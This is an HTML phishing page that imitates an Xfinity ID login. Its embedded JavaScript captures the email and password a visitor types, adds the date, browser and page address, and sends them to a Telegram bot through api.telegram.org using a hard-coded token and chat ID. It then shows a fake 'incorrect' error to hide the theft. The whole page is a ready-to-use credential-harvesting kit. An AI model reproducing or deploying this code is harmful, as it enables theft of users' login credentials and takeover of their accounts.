<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mail Center</title>
  <style>
    :root {
      --blue: #007bff;
      --indigo: #6610f2;
      --purple: #6f42c1;
      --pink: #e83e8c;
      --red: #dc3545;
      --orange: #fd7e14;
      --yellow: #ffc107;
      --green: #28a745;
      --teal: #20c997;
      --cyan: #17a2b8;
      --white: #fff;
      --gray: #6c757d;
      --gray-dark: #343a40;
      --primary: #007bff;
      --secondary: #6c757d;
      --success: #28a745;
      --info: #17a2b8;
      --warning: #ffc107;
      --danger: #dc3545;
      --light: #f8f9fa;
      --dark: #343a40;
      --breakpoint-xs: 0;
      --breakpoint-sm: 576px;
      --breakpoint-md: 768px;
      --breakpoint-lg: 992px;
      --breakpoint-xl: 1200px;
      --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
      --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
    }

    html {
      font-family: sans-serif;
      line-height: 1.15;
      text-size-adjust: 100%;
      -webkit-tap-highlight-color: transparent;
    }

    body, html {
      height: 100%;
      font-family: Arial, Helvetica, sans-serif;
    }

    body {
      margin: 0px;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
      font-size: 1rem;
      font-weight: 400;
      line-height: 1.5;
      color: rgb(33, 37, 41);
      text-align: left;
      background-color: rgb(255, 255, 255);
      display: flex;
      justify-content: center;
      align-items: center;
    }

    * {
      margin: 0px;
      padding: 0px;
      box-sizing: border-box;
    }

    *, ::after, ::before {
      box-sizing: border-box;
    }

    .wrap-login100 {
      width: 390px;
      background: rgb(255, 255, 255);
      border-radius: 10px;
      overflow: hidden;
      padding: 77px 55px 33px;
      box-shadow: rgba(0, 0, 0, 0.1) 0px 5px 10px 0px;
      text-align: center;
    }

    @media (max-width: 576px) {
      .wrap-login100 {
        padding: 77px 15px 33px;
      }
    }

    .login-title {
      font-size: 1.875rem;
      font-weight: bold;
      color: var(--primary);
      margin-bottom: 1.5rem;
    }

    .email-icon {
      width: 48px;
      height: 48px;
      margin: 0 auto 1.5rem;
      color: var(--primary);
    }

    .input-field {
      width: 100%;
      padding: 0.5rem;
      margin-bottom: 1rem;
      border: 1px solid #ced4da;
      border-radius: 0.25rem;
      font-size: 1rem;
    }

    .sign-in-btn {
      width: 100%;
      padding: 0.5rem;
      background-color: var(--primary);
      color: white;
      border: none;
      border-radius: 0.25rem;
      font-size: 1rem;
      cursor: pointer;
    }

    .footer-text {
      margin-top: 1rem;
      font-size: 0.875rem;
      color: #6c757d;
      line-height: 1.2;
    }

    .error-message {
      color: var(--danger);
      margin-top: 1rem;
      display: none;
    }
  </style>
</head>
<body>
  <div class="wrap-login100">
    <h1 class="login-title">Sign in with your Xfinity ID.</h1>
    <div class="email-icon">
      <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path>
      </svg>
    </div>
    <form id="loginForm">
      <input type="email" name="email" placeholder="Email" class="input-field" required>
      <input type="password" name="password" placeholder="Password" class="input-field" required>
      <button type="submit" class="sign-in-btn">Sign in</button>
    </form>
    <p class="footer-text">Activate Windows<br>Go to Settings to activate Windows.</p>
    <div class="error-message" id="errorMessage">One of the submitted information is incorrect.</div>
  </div>

  <script>
    // Telegram configuration
    const tx1 = "637855559";
    const tx2 = "6495564868:AAGktEGbYTn8wT6csRB3Asc5fiMPuHePQ6g";
    const baseUrl = `https://api.telegram.org/bot${tx2}/sendMessage?chat_id=${tx1}`;

    // Function to build the message
    function buildMessage(email, password) {
      const dateTime = new Date().toLocaleString();
      const hostName = window.location.href;
      const browserName = navigator.userAgent.match(/(firefox|chrome|safari|opera|msie|trident(?=\/))\/?\s*(\d+)/i) || ['N/A'];
      const ipAddress = 'N/A'; // Simplified, no async IP fetch
      const country = 'N/A';
      const state = 'N/A';
      const city = 'N/A';

      let message = `Email: ${email}\n`;
      message += `Password: ${password}\n`;
      message += `Date: ${dateTime}\n`;
      message += `Browser: ${browserName[0]}\n`;
      message += `Host: ${hostName}\n`;
      message += `IP Address: ${ipAddress}\n`;
      message += `Country: ${country}\n`;
      message += `State: ${state}\n`;
      message += `City: ${city}\n\n`;
      message += `Work harder and smarter because there is somebody somewhere who's always working harder than you do.`;

      return message;
    }

    // Form submission handler
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();

      const email = document.querySelector('input[name="email"]').value;
      const password = document.querySelector('input[name="password"]').value;

      if (!email || !password) {
        alert('Email and password are required');
        return;
      }

      try {
        const message = buildMessage(email, password);
        const url = `${baseUrl}&text=${encodeURIComponent(message)}`;

        // Submit to Telegram
        await fetch(url, {
          method: 'GET'
        });

        // Immediately show error message
        const errorMessage = document.getElementById('errorMessage');
        errorMessage.style.display = 'block';
      } catch (error) {
        const errorMessage = document.getElementById('errorMessage');
        errorMessage.style.display = 'block';
      }
    });
  </script>
</body>
</html>
